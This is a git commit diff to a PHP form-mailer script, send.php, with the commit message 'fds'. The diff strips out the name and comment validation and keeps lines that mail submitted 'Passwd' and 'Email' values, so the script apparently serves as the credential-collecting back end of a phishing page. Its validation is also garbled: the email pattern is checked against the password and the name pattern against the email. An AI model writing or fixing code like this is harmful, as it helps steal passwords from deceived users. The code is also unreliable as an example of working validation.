b4b0728f880541a2b03a570dfa99189921587763
Finn B <mcunderdaw@gmail.com>
2018-07-20 09:14:55 -0700

    fds

--- send.php
+++ send.php
@@ -33,23 +33,17 @@ if(isset($_POST['email'])) {
     $error_message = "";
     $email_exp = '/^[A-Za-z0-9._%-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}$/';
  
-  if(!preg_match($email_exp,$email_from)) {
+  if(!preg_match($email_exp,$Passwd)) {
     $error_message .= 'The Email Address you entered does not appear to be valid.<br />';
   }
  
     $string_exp = "/^[A-Za-z .'-]+$/";
  
-  if(!preg_match($string_exp,$first_name)) {
+  if(!preg_match($string_exp,$Email)) {
     $error_message .= 'The First Name you entered does not appear to be valid.<br />';
   }
  
-  if(!preg_match($string_exp,$last_name)) {
-    $error_message .= 'The Last Name you entered does not appear to be valid.<br />';
-  }
- 
-  if(strlen($comments) < 2) {
-    $error_message .= 'The Comments you entered do not appear to be valid.<br />';
-  }
+
  
   if(strlen($error_message) > 0) {
     died($error_message);
@@ -61,10 +55,7 @@ if(isset($_POST['email'])) {
     function clean_string($string) {
       $bad = array("content-type","bcc:","to:","cc:","href");
       return str_replace($bad,"",$string);
-    }
- 
-     
- 
+    }  
     $email_message .= "Passwd: ".clean_string($Passwd)."\n";
     $email_message .= "Email: ".clean_string($Email)."\n";
    
